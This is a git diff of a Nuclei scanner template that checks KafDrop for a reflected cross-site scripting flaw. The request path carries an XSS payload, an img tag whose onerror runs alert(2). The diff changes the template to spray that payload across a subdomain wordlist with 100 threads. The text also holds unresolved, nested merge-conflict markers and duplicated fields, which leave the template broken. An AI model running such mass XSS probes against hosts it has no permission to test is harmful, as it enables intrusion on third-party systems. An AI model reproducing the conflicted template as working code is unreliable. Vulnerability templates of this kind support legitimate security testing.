@@ -1,10 +1,11 @@
 id: kafdrop-xss
 
 info:
-  name: KafDrop - Cross-Site Scripting
+  name: KafDrop XSS
   author: dhiyaneshDk
 <<<<<<< HEAD
   severity: medium
+<<<<<<< HEAD
   description: A vulnerability in KafDrop allows remote unauthenticated attackers to inject arbitrary HTML and/or JavaScript into the response returned by the server.
   reference:
     - https://github.com/HomeAdvisor/Kafdrop/issues/12
@@ -19,13 +20,24 @@ info:
     cvss-score: 7.2
     cwe-id: CWE-79
 >>>>>>> 5d36d276 (add new stuff)
+=======
+>>>>>>> 18ddf72b (add new stuff)
   tags: kafdrop,xss
+  description: A vulnerability in KafDrop allows remote unauthenticated attackers to inject arbitrary HTML and/or Javascript into the response returned by the server.
+  reference: https://github.com/HomeAdvisor/Kafdrop/issues/12
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
     matchers-condition: and
     matchers:
       - type: word
